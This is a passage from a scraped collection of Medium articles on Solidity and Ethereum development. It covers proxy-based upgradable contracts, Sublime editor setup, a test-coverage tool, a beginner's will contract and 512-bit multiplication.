"post_date": "Apr 25, 2018", "readtime": "8 min read", "upvotes": "1.1K", "content": "How to write upgradable smart contracts in solidity\u00a0!Himanshu ChawlaBlockedUnblockFollowFollowingApr 25, 2018While working on smart contracts security audits platform QuillAudits at QuillHash, we are giving most of the time to research about best security practices in smart contracts. QuillAudits considers the following distinct and crucial facets of the smart contract code: Whether the code is secure. Whether the code corresponds to the documentation (including white paper). Whether the code meets best practices in efficient use of gas, code readability, etc.An approach to upgrade contracts must be in the armour to prevent damage made by programming bugs after contract got deployed.The Topic of upgradeable contracts is not very new to the world of ethereum. There are some different approaches to upgrade smart contracts.Some approaches we considered in development are:-Separate logic and data.Partially upgradable smart contracts system.Separate logic and data in key value pairs.Eternal storage with proxy contractWith first three approaches the contract can be updated by pointing users to use the new logic contract (through a resolver such as ENS) and updating the data contract permissions to allow the new logic contract to be able to execute the setters.In forth approach we don\u2019t need to do this redirection and its is very flexible approach to update smart contracts.We found that eternal storage with proxy contract approach is flawless till now.Readers are most welcome to comment if you know any flaw in this approach. It will be very helpful for developers community.There is a good reason for and against being able to update smart contracts.The good reason is all the recent hacks were based on programming error and could be fixed very easily if it was possible to upgrade those contracts.However the ability to upgrade smart contracts after they got deployed is somewhat against the ethics and immutability of blockchain.People need to trust you that you are a good boy. One thing that might makes sense would be to have multi-sig-upgrades, where the \u201cOK\u201d from multiple people is necessary before a new contract is deployed and can access the storage.I think that it is storage records which needs to be immutable in blockchain.Logic must be improved with time as in all software engineering practices.No one can guarantee to develop bug free software in first version.So Upgradeable smart contracts with some upgrading governance mechanism can save many hacks.In this post, I will touch the upgrade mechanism and in follow up post i will try to come with best contract upgrading governance mechanism.So lets start with implementation approach\u00a0!!The most important thing to consider when upgrading contracts is how to preserve the state of the original contract in the upgraded contract.The state of the contract can be separated from the functionality of the contract. This approach allows multiple contracts to share the same state.In this approach, a proxy contract will act as a immutable storage contract and delegate contract will contain the functionality.The storage structure of both these contracts must be similar.To upgrade the logic of contract we need to inform the proxy contract the address of new delegate contract\u00a0.When a transaction is sent to proxy contract\u00a0,it does not know about the specified function in the transaction.Proxy contract will proxy the transaction to what we\u2019ll refer to as a \u201cdelegate\u201d contract (Which contains the functionality logic).This is done using the native EVM code, delegate call.With delegate call, a contract can dynamically load code from a different address at runtime. Storage, current address and balance still refer to the calling contract, only the code is taken from the called address.When a proxy contract uses a delegate contract\u2019s functionality, state modifications will happen on the proxy contract. This means that the two contracts need to define the same storage memory. The order that storage is defined in memory needs to match between the two contracts.We will deploy these contracts initially\u00a0:-key Storage Contract (Contains the shared state)Delegate contractV1 and Delegate contractV2Proxy Contract (Contains the delegate call functionality)Key Storage contract\u00a0:-It contains a common storage for all storage state variables which will be shared among all versions of smart contract.It also contains getter and setter functions to update and get the value of state from delegate contract.Key Storage contract can be consumed by any delegate contract via proxy contract once deployed.We cannot create new getter and setters once key storage got deployed so we need to consider this while designing the initial version of smart contract.The best approach is to make mappings for every type of field in key storage contract.Where the key of mapping will be the the name of the key simply in bytes and value will of the type declared in mapping.For ex:- mapping(bytes32 => uint)Now we can use this mapping to set and get any integer value from delegate contract by calling key storage getter and setter function for uint type.For ex: we can set the total supply with the key \u201ctotalSupply\u201d and with any uint value.But wait something is missing,Now anyone can call our key storage contract getter and setter function and update the state of storage which is getting used by our delegate contract.So to prevent this unauthorised state change we can use the address of proxy contract as the key of mapping.mapping(address => mapping(bytes32 => uint)) uintStorageIn our setter function:function setUintStorage(bytes32 keyField, uint value) public {uintStorage[msg.sender][keyField] = value}Now as we are using msg.sender address in setter function and only this state change will reflected in proxy contract state when it uses getter function to get the state.Similarly we can create other state mappings along with getter and setter functions as shown in the code below:-Delegate contract\u00a0:-Delegate contract contains the actual functionality of dApp.It also contains a local copy of KeyStorage contract.In our dApp\u00a0,if we include a certain functionality and later we found a bug in deployed contract\u00a0,in that case we can create a new version of delegate contract.In code below\u00a0,Delegate contract version 1 (\u201cDelegateV1.sol\u201d) is deployed.After deploying DelegateV1 we noticed the number of owners can be set by any user\u00a0.So now we want to upgrade the smart contract so that only owner of contract can set number of owners.We cannot change the code of already deployed contract in ethereum. So obvious solution is to create a new contract and new contract too will contain a local copy of Key Value contract. Here we are creating DelegateV2.sol contract with onlyOwner modifier added.Now we have created a new contract but the storage of previous contract is not available in new version of contract.So we can include a reference to actual keyStorage contract in every version of delegate contract\u00a0.In this way every version of delegate contract shares a same storage.But one thing is not desirable here, we need to tell every user about the address of updated version of contract so that they can use updated contract.It sounds stupid.So we will not store actual copy of key storage contract in every version of delegate contract\u00a0.To get a shared storage proxy contract comes in to the rescue\u00a0, lets move on to proxy contract.Proxy Contract:-A proxy contract uses the delegatecall opcode to forward function calls to a target contract which can be updated. As delegatecall retains the state of the function call, the target contract\u2019s logic can be updated and the state will remain in the proxy contract for the updated target contract\u2019s logic to use. As with delegatecall, the msg.sender will remain that of the caller of the proxy contract.A delegate call can dynamically load code from a different address at runtime. Storage, current address and balance still refer to the calling contract, only the code is taken from the called address.SO we just need to pass the address of new version of contract to proxy contract via upgradeTo function.The code of proxy contract is quite complicated in fallback function as here low level delegate call assembly code is used.Let break it down simply what is getting done in assembly code:-delegatecall(gas, _impl, add(data, 0x20), mload(data), 0, 0);In above function delegate call is calling code at \u201c_impl\u201d address with the input \u201cadd(data,0x20)\u201d and with input memory size \u201cmload(data)\u201d,delegate call will return 0 on error and 1 on success and result of the fallback function is whatever will be returned by the called contract function.In proxy contract we are extending StorageState contract which will contain a global variable to store address of keyStorage contract.The order of extending storage state contract before ownable contract is important here.This storage state contract will be extended by our delegate contracts and all the functions logic executed in delegate contract will be from the context of proxy contract.The order of storage structure of Proxy contract and Delegate contract must be same.Now user will always interact with dapp via same address of proxy contract and state of key storage contract seems to be shared among all versions of contract but in actual only proxy contract contains the reference to actual keyStorage contract.Delegate contracts contains local copy of keyStorage contract to get the getter\u00a0,setter functions logic and to have similar storage structure like proxy contract but actual storage changes are getting done from the context of proxy contract only.Deploying and testing it together:-Here output of test cases will be\u00a0: 10 10 and 20We are calling getNumberOfOwners() three times in test case.First to get the state change by DelegateV1 contract\u00a0.Second time to get the state modified by DelegateV1 from DelegateV2 contract and we success fully managed to retain the state modified by DelegateV1 and third time to get the state modification done by DelegateV2 contract.Note here that we are calling getNumberOfOwners() every time from the same address of proxy contract.So we successfully managed to update the functionality of our contract with out losing the previous state.If we call setNumberOfOwners() from any other address except account[2] which is contract owner address, it will throw revert error.Lets wind up the article with some diagrams:-call upgrade to DelegateV2At Quillhash we are developing a platform Quillplay to create secure and customised smart contracts templates for users with no programming experience.https://quillhash.com/quillplayI will try to come up with some upgrading governance mechanism in next post.You can see the complete code here:-https://github.com/Quillhash/upradeableToken.gitThanks for reading. Also do check out our earlier blog\u00a0posts.To be up to date with our work, Join Our Community\u00a0:-Telegram | Twitter | Facebook | LinkedInReferences:https://blog.colony.io/writing-upgradeable-contracts-in-solidity-6743f0eecc88https://medium.com/level-k/flexible-upgradability-for-smart-contracts-9778d80d1638https://medium.com/cardstack/upgradable-contracts-in-solidity-d5af87f0f913https://blog.zeppelinos.org/smart-contract-upgradeability-using-eternal-storage/https://medium.com/rocket-pool/upgradable-solidity-contract-design-54789205276d", "responses": "11"}, {"title": "Ethereum-Solidity language syntax in\u00a0Sublime", "author_name": "Abhinav Prakash", "link": "https://medium.com/coinmonks/ethereum-solidity-language-syntax-in-sublime-1532e6f3646d?source=search_post", "post_date": "Aug 7, 2017", "readtime": "2 min read", "upvotes": "792", "content": "Ethereum-Solidity language syntax in\u00a0SublimeAbhinav PrakashBlockedUnblockFollowFollowingAug 7, 2017I personally like Sublime as a text-editor more compared with all other existing text editors (including Vim, yes I said it\u200a\u2014\u200asue me), exception is JetBrains ones. Other than Python for which I use Pycharm, Sublime is my default. Before taking on programming on blockchain, Ethereum\u2019s EVM specifically, one needs some foundation of solidity language which the existing documentations make decent effort to explain. It is always there is add and expanded upon.Since I personally like to use Sublime, following are the steps to add Solidity language syntax on Sublime text editor.Step 1: Install Package\u00a0ControlsPackage Control is a package manager for Sublime Text 2, 3. Open Sublime\u2019s console.View -> Show ConsolePaste the following code in the console and hit returnimport urllib.request,os,hashlib; h = 'df21e130d211cfc94d9b0905775a7c0f' + '1e3d39e33b79698005270310898eea76'; pf = 'Package Control.sublime-package'; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( 'http://packagecontrol.io/' + pf.replace(' ', '%20')).read(); dh = hashlib.sha256(by).hexdigest(); print('Error validating download (got %s instead of %s), please try manual install' % (dh, h)) if dh != h else open(os.path.join( ipp, pf), 'wb' ).write(by)Step 2: Restart Sublime and Install\u00a0PackageRestart Sublime after Package Control installation. Open the Package Control by:Cmd + Shift + PType Install and choose:Package Control: Install PackageWait a few seconds before Sublime gives options of packages to install. Type \u2018Ethereum\u2019 and off you go.Restart Sublime and get cracking.", "responses": "10"}, {"title": "Code Coverage for\u00a0Solidity", "author_name": "Alex Rea", "link": "https://medium.com/colony/code-coverage-for-solidity-eecfa88668c2?source=search_post", "post_date": "Oct 3, 2016", "readtime": "7 min read", "upvotes": "462", "content": "Code Coverage for\u00a0SolidityAlex ReaBlockedUnblockFollowFollowingOct 3, 2016Ensuring the security of deployed Ethereum contracts is one of the most important challenges facing Ethereum developers today. After the unfortunate problems with the DAO, the resulting hard fork and associated community fallout, hopefully no-one reading this article would disagree. Indeed, there was a whole session devoted to the topic at the recent DevCon2, with talks spanning formal verification, coding best practices and more. However, the Ethereum community seems to have been silent regarding one of the first tools invented to help avoid unintended behaviour from code\u200a\u2014\u200acode coverage.Code coverage, first devised in the 1960s, encapsulates the idea that tests should \u2018touch\u2019 all of the code under test. If the tests execute all of your code, and the results from the tests are as expected, it is less likely your code contains unforeseen bugs. Untested code could do anything!I will freely admit this is not a silver bullet. Writing tests achieving even 100% code coverage would not have caught the reentrancy bug that was the fatal flaw in the DAO unless someone had written a particularly inspired test. Indeed, blindly writing tests to achieve 100% coverage is probably not the best use of a developer\u2019s time. Code coverage should only be treated as another arrow in our collective quiver.ResultsI have written a tool called SolCover. It uses Istanbul (see later) to generate the reports themselves. The HTML report is probably the easiest for users to interpret:Snippet from some code coverage\u00a0results.The numbers in the margin indicate each line here is run 17 times during the tests. Which seems good! But we need to look deeper. The black block containing a yellow \u2018I\u2019 tells us the \u2018if\u2019 statement never evaluated to true in any of the tests, and this is also shown by \u2018throw\u2019 being highlighted in red, which indicates that statement is never executed. Perhaps this is an oversight in the testing, and a user with the wrong permissions is just never used. But perhaps the \u2018userIsInRole\u2019 function has a bug, and only ever returns \u2018true\u2019, and this represents a security hole? The only way to know is to write a test that should trigger that branch\u2026If you are not interested in methodology used, and just want to use SolCover, you can get it from GitHub, where the usage instructions can be found too, but be aware that is probably still extremely fragile at the moment. Otherwise, carry on for an overview of the general method and then some nitty-gritty details.ImplementationThis was only as easy to put together as it was because of the excellent tools that already exist, both in Ethereum and the wider community. Istanbul is used throughout the Javascript community for code coverage, and is well supported and documented. It generates a coverage.json file, which is then interpreted in conjunction with the source files to make the coverage report. My script generates the coverage.json file independent of Istanbul, but in the expected format, and just uses Istanbul to generate the reports after the fact.For the testing itself, it is assumed Truffle is being used, as this is what we\u2019re using at Colony. This is a great testing framework that uses the Javascript frameworks Mocha and Chai for running and writing the tests and makes it very easy to start writing tests. Indeed, it expects it of you, with the demo project created with the \u2018truffle init\u2019 command pointedly containing a \u2018test\u2019 directory.How does SolCover know which lines or statements have been run? By changing the source code through a process called instrumentation, which is how most coverage tools work. Before every line or statement of interest, a call to emit an event is inserted that indicates the immediately following piece of code has been run. These events are then interpreted alongside the source files to generate the \u2018coverage.json\u2019 file, which is used to generate the report itself.The instrumentation is done by parsing the contracts with SolParse, and then based on the statements there, altering the contract appropriately. There were technical issues surrounding injecting these alterations to the contract, however, some of which are described in the \u2018instrumentation notes and difficulties\u2019 section below.In the context of Ethereum, a large amount of instrumentation on an already large contract requires increasing the block size limit so the modified contract can be deployed. This is trivial to do when using TestRPC (requiring only a command line flag), which SolCover uses when running the tests. However, it does also require modification of a project\u2019s truffle.js due to the increased contract size, and therefore deployment costs.Instrumentation notes and difficultiesModifersModifier definitions are treated exactly the same as function definitions, and are therefore counted in the \u2018function coverage\u2019 metric.The ternary\u00a0operatorThe ternary operator is an incredibly useful tool, which allows concise code to be written without sprawling \u2018if\u2019 statements. A simple use of it looks like:This snippet sets \u2018x\u2019 to either 1 or 2, depending on whether y is equal to z or not. We wish to instrument it and so be able to track whether the statement has resolved to both false and true during our tests. In Javascript, Istanbul would instrument this code in the following way:The comma operator is used here to change the underlying code as little as possible. Unfortunately, the comma operator does not exist in solidity at the statement level (which is certainly confusing to me). To instrument this code successfully, we have to modify it more than I would like:This abuses the fact that on the left hand side of an assignment operator, a tuple is allowed to have empty elements. This works, and is probably the best we can achieve here without the comma operator as a first-class citizen..call() and\u00a0throwIn Ethereum, functions in a contract can be called locally, which means they do not actually cause changes to the blockchain. They are executed, usually to read a value or estimate gas costs for a transaction, and then reverted without the transaction being broadcast to the network. Unfortunately, this means if we relied on a filter\u200a\u2014\u200awhich is the usual way to access events\u200a\u2014\u200athese events would be invisible to us, and would not be seen by our coverage.Similarly, if a transaction fails due to a throw statement being hit, while a transaction is created all changes are reverted (other than all gas sent with the transaction being taken). This includes events. That means ordinarily, our test coverage would not be able to tell us when our contracts threw\u200a\u2014\u200awhich we should certainly be making sure they do at appropriate points.To get around these problems, I modified ethereumjs-vm to log all events as they were executed on the VM to a separate file. Even when the changes due to a transaction are reverted, this file logs the event occurred, however quickly it was reverted. This allows us to track coverage even in these cases, and get a true idea of our test coverage.Invisible else\u00a0branchesRather than explain the subtlety here, I will just link to an excellent blogpost discussing the importance of branch coverage as well as line coverage, before noting we also have to transform \u2018if\u2019 statements in nonintuitive ways. If we have the very reasonable looking code:This needs to be transformed to track if all possible branches have been tried. The transformation used is again more invasive than I would like, but works.Other caveatsIt is entirely possible that when running SolCover, your tests will fail if they test or rely on properties of your contracts related to how much gas they use. This is because the instrumentation process significantly increases the cost for a deployment (up to ~4 times), as well as the cost of function calls due to the extra events. I have already made the gas cost for EVM\u2019s LOG call zero to help this, but further work should probably be done on this front. Given that this tool already uses its own modified TestRPC\u00a0, this is easy implement with few other side effects.ConclusionThis only really rates as a first stab at a coverage tool. Some types of statements could easily be instrumented incorrectly, or have been overlooked in this implementation. Eagle-eyed developers will note\u200a\u2014\u200apresumably with a wry grin\u200a\u2014\u200athat there are very few tests in the repository! Issues describing problems users encounter are of course welcome at GitHub, especially if they are accompanied by pull requests!", "responses": "1"}, {"title": "Introduction to Solidity Programming and Smart Contracts (For Complete Beginners)", "author_name": "Etienne Dusseault", "link": "https://medium.com/coinmonks/introduction-to-solidity-programming-and-smart-contracts-for-complete-beginners-eb46472058cf?source=search_post", "post_date": "Aug 4, 2018", "readtime": "13 min read", "upvotes": "535", "content": "Introduction to Solidity Programming and Smart Contracts (For Complete Beginners)Okay wait, slow down\u2026 What exactly is solidity and what makes these contracts so\u00a0\u201csmart\u201d?Etienne DusseaultBlockedUnblockFollowFollowingAug 4, 2018**ATTENTION** \u2192 UPDATED April 14th 2019 for Solidity 0.5.7Solidity is a brand new programming language native to Ethereum, the second largest cryptocurrency by market capitalization, initially released in 2015. Ethereum is not only a cryptocurrency capable of storing value or making payments, but a fully fledged platform for creating what\u2019s known as a smart contract.For all intents and purposes, a smart contract is a programmable escrow of sorts, an independent middleman or a fair judge capable of managing a financial transaction between various parties and autonomously arbitrating a dispute.What does this all mean?Say a grandfather who is in his last years wants nothing more than to have his inheritance delivered down to his family through means of a will when he passes. In a traditional will, it would be clear who gets what, how much and when, solidified in a legally bound document. When the time comes to actually distribute the sauce, a judge from a court of law needs to revise the document and make decisions accordingly. A common problem that arises within families is an argument about who gets what, creating tension at best and destroying relationships at worst. During the court hearing, This could influence the decision of the judge, which in turn could produce unfair results and possibly create further damage to family bonds.So that being said, what if we could streamline this process by drastically reducing this problem?If the will was a smart contract, a judge would not be necessary. Here\u2019s where it gets awesome. Gramps can actually make the contract hold assets on his behalf, and have them programmatically released to his liking after his passing. In this scenario, the code written in the contract itself would dictate the outcome, effectively eliminating the need for an arbitrator. Sarah gets $10,000, Ben gets $5,000 and Julia gets $2,000. The code executes and the assets in the form of a token or cryptocurrency get automatically distributed to these parties without the need for human intervention. While everyone involved may not be happy with the outcome, nobody can really argue with lines of code on a screen. Sounds practical, right?Keeping this example in mind, let\u2019s get to the part you\u2019ve all come here for. In this lesson we will build gramps a simple will through a smart contract written in solidity.Set up the EnvironmentHead over to Remix. This will serve as the development platform for writing your first smart contract. Your screen should look like this or something similar:Head over to the top left dropdown \u201cEnvironment\u201d and make sure \u201cJavascript VM\u201d is selected. This means that all the code will run as a standalone, and not interact with the actual Ethereum network in any way. Click the + icon in the top left corner to create a new file, and call it \u201cwill.sol\u201d. A tab will appear at the top which represents which file is currently being edited.2. Define the\u00a0VersionIn solidity, the first line must always state its current version. Is should look like this:Version at the time of writing:\u00a00.5.73. First\u00a0ContractSkip a line and type the following:Each new contract must be prepended with \u201ccontract\u201d, then the name with the first letter always capitalized, followed by open/close curly brackets to contain the logic. Use a double forward slash to write a comment, which is useful for describing for what the code does without altering it.4. Global Variables and the ConstructorBefore we start writing code, we should already have the terms of the will clearly defined. Let\u2019s say gramps is leaving behind a fortune of 50 Ethers. 20 will go to his son Conrad and the remaining 30 to his wife Lisa. Realistically, when gramps passes away, an external program would call a function inside the contract to distribute the funds, but we will take care of that ourselves for the purposes of this tutorial. Check the comments section for discussion on this!Let\u2019s start by declaring:The owner of the contractThe amount of fortune left behindA switch that tells us if gramps is still aliveA constructor function that sets these values.Line 5 declares the owner. When declaring variables in solidity, they must be prepended with their type. Owner in this case is of type \u201caddress\u201d which is unique to solidity and represents an Ethereum wallet address. This will be useful later on when calling specific functionality only meant for the owner (gramps).Line 6 will hold the value of the fortune gramps is leaving behind. Its type is a uint or \u201cunsigned integer\u201d which means it can only be a positive number. Solidity has many types, but we will not cover all of them here. They can be found in the official documentation for further reading.Line 7 tells us whether gramps is deceased or not in the form of a boolean value, true or false. It is set to false by default.Lines 9\u201313 is the constructor function. This special function will execute automatically upon the contract\u2019s deployment.The \u201cpublic\u201d keyword is what\u2019s known as a \u201cvisibility modifier\u201d which tells the contract who is allowed to call the function. Public means that the function can be called within the contract and outside of it by someone else or another contract.The \u201cpayable\u201d keyword is what makes solidity truly unique. It allows the function to send and receive ether. The constructor has this modifier so that when we deploy the contract we can initialize it with an ether balance, in this case 50. When the contract receives ether, it will store it in its own address.Here, we set the owner to \u201cmsg.sender\u201d, which is a built-in global variable representative of the address that is calling the function. In this case, it will be us (gramps).The fortune is set to \u201cmsg.value\u201d, which is another built-in variable that tells us how much ether has been sent.Even though isDeceased is set to false by default, it\u2019s set manually here to provide clarity.5. ModifiersModifiers are add-ons to functions that contain conditional logic. For example, I have a function that turns off a light switch and a modifier that states the light switch must be \u201con\u201d. I add the modifier to function so that it can only be called if the switch is \u201con\u201d and will throw an error if the switch is \u201coff\u201d.Line 15 declares the \u201conlyOwner\u201d modifier. If added to a function, it can only be called if the caller (msg.sender) is equivalent to the owner variable as stated above (remember how we set the owner in the constructor). We will need this to allow the distribution of funds, which will be implemented later.The \u201crequire\u201d keyword states that everything written within the following parenthesis must be equal to true or else solidity will throw an error and the execution will stop.The \u201c_;\u201d at the end tells the execution to shift to the actual function after it finishes reading the modifier.Line 20 declares the \u201cmustBeDeceased\u201d modifier. Once added to a function, it can only be called if the value of \u201cisDeceased\u201d is true. We will also use this to allow for the distribution of funds. There is currently no way to set it to true, but we will fix that later.As an aside, we could just write \u201crequire\u201d underneath each function declaration, but using modifiers is a great way to avoid repetition and to reuse code.6. InheritancesNow we must declare how the loot is divided amongst the family members. We will need their public wallet keys (addresses) and their desired allotments.As we stated before, Conrad will receive 20 ETH and Lisa will inherit 30. Let\u2019s create a list to store their wallet addresses and a function that sets the inheritance for each address.Line 25 declares an empty array called \u201cfamilyWallets\u201d for storing the family members\u2019 wallet addresses. This is a list-like data structure in which any element can be indexed and subsequently accessed within it. Notice the keyword \u201cpayable\u201d before the brackets. This allows the address(es) to receive Ether. The square brackets after \u201caddress\u201d indicate it\u2019s an array of items rather than a single variable.Line 27 creates a mapping from an address type to a uint type named \u201cinheritance\u201d for stashing the value of each address\u2019 inheritance. This is a key/value pair data structure in which the key can be called to obtain the value. It\u2019s the equivalent of a \u201cdictionary\u201d in other languages such as Python and Javascript.Line 29 declares the function that adds an address to the array we just created, then sets the inheritance given the address. When we call it, we must provide it with one family member\u2019s wallet address along with their allotted spoils. Notice the \u201conlyOwner\u201d modifier we added to this function. Can you guess why we stuck that in there? (Hint: look at the \u201cpublic\u201d keyword.)Line 30 simultaneously creates a wallet address and appends it to our \u201cfamilyWallets\u201d array given the input parameter \u201cwallet\u201d with \u201c.push\u201d.Line 31 takes the value of the key \u201cwallet\u201d (a parameter) from the \u201cinheritance\u201d mapping we created earlier and sets it to the inheritance given the other parameter, \u201cinheritanceAmount\u201d.Notice how logically these steps connect starting from the first. We created a spot for the wallets and the inheritance to live. The function would then populate those data fields with the information we supply it!7. Show me the\u00a0MoneyLet\u2019s recap. So far we\u2019ve learned about global variables and their types, the constructor, special keywords such as \u201cpayable\u201d and \u201cpublic\u201d, built-in variables like \u201cmsg.sender\u201d, modifiers and \u201crequire\u201d, arrays, mappings and functions. We\u2019ve built the framework, now let\u2019s tie it all together so we can complete our contract.For the last coding part of the tutorial, we\u2019ll implement a way the family can get paid by looking through each of their addresses and sending them their respective dough.Line 34 declares the \u201cpayout()\u201d function. Note the \u201cprivate\u201d keyword. This visibility modifier is the opposite of \u201cpublic\u201d as we\u2019ve seen earlier on. It permits this function to be called only within the contract as demonstrated on line 42. Security is the primary purpose as it doesn\u2019t allow anyone or any other contract to interact with it. Notice the \u201cmustBeDeceased\u201d modifier tagged on at the end. It\u2019s currently still impossible for this function to execute because of it.Line 35 is a for loop that iterates over the \u201cfamilyWallets\u201d array. The syntax is as follows: Declare a counter variable (i), state the loop\u2019s condition and increment (i) every time one cycle is complete. The code within the block will execute up until the counter is less than the length of the \u201cwallets\u201d array. (i) will start at 0 as stated, the logic will execute, (i) will increment to 1 and the logic will execute again. The cycle repeats until the condition is satisfied. Can you guess how many times it will complete the task? (Hint: look at the array\u2019s length)Line 36 is the actual task we\u2019ve been ranting about the entire lesson. \u201cfamilyWallets[i]\u201d refers specifically to the element located at the i\u2019th position in the \u201cfamilyWallets\u201d array. During the first iteration, we know that (i) is equal to 0. We can thus surmise that we want the first address in the list, as arrays always start at index 0. We then introduce a new call to \u201c.transfer()\u201d on the address we just captured. This is one relatively straightforward global method to transfer value that\u2019s embedded within Solidity. It only takes one argument, the amount we want to send. Being the savvy programmers we are, we came prepared with a data structure that contains the information in question. Can you remember where we kept it? \u201cinheritance[familyWallets[i]]\u201d refers directly to the amount of inheritance we specified in the \u201cinheritance\u201d mapping for again, each element located in the i\u2019th position in the \u201cfamilyWallets\u201d array. Since i= 0 on the first iteration, we want the inheritance of the first address in the list.To summarize, this single line of code transfers funds from the contract\u2019s address to a receiver\u2019s address which is pulled from a list with an amount equivalent to that same address\u2019 inheritance allocation.Lines 40\u201342 is the function that gets called when gramps passes away. Here, we set the value of the variable we declared right at the beginning, \u201cisDeceased\u201d, to true. Notice the repeated use of \u201cpublic\u201d and \u201conlyOwner\u201d keywords. Bearing that in mind, we can finally call \u201cpayout()\u201d to send forth the capital.For the keen eyed readers, you may be thinking \u201cisDeceased\u201d is redundant. Technically you\u2019re correct. We could eliminate \u201cdeceased()\u201d all together and change \u201cprivate\u201d to \u201cpublic\u201d & \u201cmustBeDeceased\u201d to \u201conlyOwner\u201d in \u201cpayout()\u201d. It would produce the exact same results. This switch simply aims to explore another means of implementation in which we practice utilizing modifiers. It\u2019s common practice to make functions private and have them called by a public function elsewhere for security purposes.And we\u2019re\u00a0done!Actually, not quite\u2026This smart contract is complete, but how do we actually use it? Now we can harvest the fruits of our labour.8. Contract Deployment & InteractionYour screen should look like this:Head over the Compile tab in the top right corner. Ensure your compiler version matches the one below (0.5.7), and click Start to Compile.You should see a blue box from Static Analysis. You are welcome to investigate further, but feel free to ignore it for now. Head back to Run.Ensure \u201cJavascript VM\u201d is selected for \u201cEnvironment\u201d. Under \u201cAccount\u201d, clicking the dropdown menu will reveal 5 addresses, each with a 100 ether balance. Select the first one.Deploying a contract to the Ethereum blockchain isn\u2019t free. The deployer must pay a nominal fee known as gas. Such a system is put in place to prevent people from spamming the chain with infinite loops using all the network\u2019s resources without repercussion. If you wish to know more, MyEtherWallet has a comprehensive article on the subject.Leave the \u201cGas Limit\u201d field as is.The \u201cValue\u201d field indicates the amount of ether we want to initialize the contract with when we hit deploy. Enter in 50. Remember how we added a \u201cpayable\u201d modifier to our constructor early on? Go ahead and hit \u201cDeploy\u201d.You should notice 3 things right away. First of all, the balance of the selected account should now read 49.9999\u2026 This is due to the 50 ether we gave to the contract, plus the small fee for deploying it. The console at the bottom will also provide additional details about the deployed instance, feel free to inspect it. The main thing to realize is this:This is our contract instance! It generates its own address and displays the two public functions we created. As the owner, the first thing we want to do it set the inheritances of Conrad (20) and Lisa (30). Let\u2019s say that Conrad\u2019s address is the second one in the dropdown, Lisa\u2019s the third. Select the second one, copy it by clicking the clipboard icon and paste it into the field above.Before we execute, there are a couple of things to keep in mind. If you try to click the shiny button, it will fail. Can you guess why? (Hint: look at our modifiers.) The other caveat here is in the amount. When working with Ether, contracts read the numbers in Wei, which is a tiny fraction of Ether. So tiny in fact, that one ETH is equal to 1x10\u00b9\u2078 Wei. (That\u2019s 1,000,000,000,000,000,000). Luckily, theres a tool that does the conversion for us.Separate the address with a comma and paste in the value of 20 Ether in Wei. To answer the above question, make sure the first address in the dropdown is selected, not the second. Any other address won\u2019t work because of the \u201cOnlyOwner\u201d modifier! (Whichever one is selected during deployment is crowned owner due to \u201cowner = msg.sender\u201d)Let\u2019s launch the rocket and repeat the same steps for Lisa. You should see the console outputting success messages. Inspect them and look for a section labeled \u201cdecoded input\u201d.As you can see, it displays the inputs we provided it.The estate is set, but the sad news is in. Gramps has passed away of a heart attack during an arctic exploration expedition at the age of 73. He was an ambitious man, always full of energy. He grabbed life by the balls at every corner and didn\u2019t take no for an answer. This dude even invested in crypto during the 2017 bull run and made some bank. He knew this day would come so he packed his winnings into the will and wished a prosperous life to his loved ones.As we commemorate the death of a great man, we also call \u201cdeceased()\u201d in his will. The console will smile, and the addresses will increase in balance. Keep in mind here that the account will have to spend some gas to execute the function. Open the dropdown menu and indulge in your success. Yes, you\u2019ve just created your first fully functional smart contract! Go treat yourself to some ice cream, you deserve it!If you\u2019ve made it this far, you yourself are an exceptional human being. Maybe by the time you hit your last days, this technology will be mainstream and you can create your own an autonomous estate manager for your loved ones.To terminate this tutorial, we must discuss one last question, one you may have been wondering throughout the journey. How on earth is gramps suppose to call the function if he\u2019s dead?!? A futuristic solution would be to somehow have an IOT device that can remotely track a heartbeat that would have the power to execute the function if the beat stopped for more than x amount of time. Any other solution you can think of? Post it in the comments!-EtienneFor the thumbnail!", "responses": "8"}, {"title": "Mathemagic: Full Multiplication", "author_name": "Remco Bloemen", "link": "https://medium.com/wicketh/mathemagic-full-multiply-27650fec525d?source=search_post", "post_date": "Dec 15, 2017", "readtime": "5 min read", "upvotes": "485", "content": "Mathemagic: Full MultiplicationRemco BloemenBlockedUnblockFollowFollowingDec 15, 2017A lot of smart contracts use the SafeMath library. It prevents contracts from having incorrect results, but it does so by failing transactions instead of making them correct. Let\u2019s instead try to do the math correctly. In this series, I will derive some advanced techniques. Today, I\u2019ll make a better safeMul.If you multiply two numbers, the result will be a number twice the size. In Ethereum, when you multiply two numbers, the result can be up to 512 bits. But Ethereum only gives you the lower half; it simply ignores the rest. This is a common practice in mathematics called modular arithmetic.However, ignoring numbers is not an acceptable practice in accounting. Care needs to be taken to avoid it or someone will lose something valuable. A popular library called SafeMath detects when it happens and then fails the transaction. But what if you do not want your transaction to fail?What if you want to multiply any numbers and have the complete result?Spoiler alert: this is snippet of Solidity code will do that for you:Optimized full 512 bit multiplication in Solidity.But before we get into that, let\u2019s define the problem precisely: We have two unsigned numbers a and b, both 256 bits in length and we want their product, a 512-bit number x.Since this number is too large to be represented directly in code, we split it up into the least significant and most significant 256 bits, r\u2080 and r\u2081 respectively:Where the square brackets with subscript represent the modulo operation and the lower-half brackets on the right represent the floor operation.Schoolbook algorithmThe classical way of solving this problem is by long multiplication, the method we all learned in school. You split your large number into decimals, multiply the digits, and then add the intermediate results. This method also works in binary and other bases. Let me quickly show you how you would use it here:Since we have 256 bit multiply build in, we can multiply any two 128 bit numbers and get the full result. So if we split our large number into groups of 128 bits we can compute all their products. Take a\u2080 and a\u2081 to respectively mean the least significant and most significant 128 bits of a, similarly for b:Now the original numbers a and b can be written as:If we substitute this in product equation it becomes:Ignoring the constants, we now have four multiplications instead of one. But all four of them involve numbers less than 2\u00b9\u00b2\u2078 that can be computed directly. The result is still too large, so we still need two numbers r\u2080 and r\u2081 to represent it. I will skip the steps of how to get r\u2080 and r\u2081 from this expression. It is straightforward, but annoying because of the shifts and carries. The final result is:Schoolbook algorithm for 512 bit multiplication.(Note that Solidity, as of 0.4.18, actually fails to compile the above example because the compiler can not handle that many local variables. This is easily solved by inlining some expressions, but since it reduces readability I opted not to do that for this example.)The two multiplications for i01 and i10 can be replaced by one using the Karatsuba algorithm, at the expense of a few more additions. Since additions are 3 gas and multiplications only 5, this is not worth it. But if you want to do larger multiplications (say 4096 bit) it is worth looking into these methods.We have now solved the problem using two modulo operations, four divisions, six additions, two conditional branches, and no less than six multiplications. The entire function takes a bit over 300 gas. 